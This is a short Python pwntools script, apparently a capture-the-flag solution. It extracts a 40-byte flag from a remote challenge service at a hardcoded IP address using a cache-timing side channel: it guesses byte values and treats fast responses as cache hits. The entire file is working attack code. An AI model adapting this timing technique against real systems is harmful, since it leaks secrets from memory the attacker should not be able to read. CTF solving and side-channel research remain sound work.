from pwn import *
from multiprocessing.pool import ThreadPool

def get_byte(index):

	c = remote('18.208.150.174', 9191)
	val = 10

	# Load flag byte into reg a
	c.sendline('ld a ' + str(index))
	c.recvline()

	for guess in range(126, 31, -1):
		# Clear cache
		c.sendline('clear')
		c.recvline()

		# Load guess addr so guess addr is in cache
		c.sendline('ld b ' + str(guess))
		c.recvline()

		# Store something in flag byte addr
		c.sendline('ldi c a')
		time = float(c.recvline().strip())

		# Check if cache hit - if it did, the guess was right
		if time < .01:
			val = guess
			break

	c.close()
	return chr(val)


# print get_byte(0)
pool = ThreadPool(5)
results = pool.map(get_byte, range(40))
print ''.join(results)
